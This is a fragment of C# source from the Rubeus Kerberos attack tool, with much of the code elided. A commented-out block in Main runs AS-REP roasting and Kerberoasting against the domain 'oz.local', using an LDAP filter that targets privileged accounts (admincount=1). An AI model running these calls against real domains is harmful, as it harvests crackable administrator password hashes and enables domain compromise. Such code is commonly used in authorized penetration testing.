...
namespace Rubeus
{
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            {
                /*
                string asreproast = "asreproast";
                var arreproast_arguments = new Dictionary<string, string>() {
                    {"/domain","oz.local"},
                    {"/ldapfilter","\'admincount=1\'" }
                };

                MainExecute(asreproast, arreproast_arguments);

                string kerberoast = "kerberoast";
                var kerberoast_arguments = new Dictionary<string, string>() {
                    {"/domain","oz.local"},
                    {"/ldapfilter","\'admincount=1\'" }
                };

                MainExecute(kerberoast, kerberoast_arguments);
                */
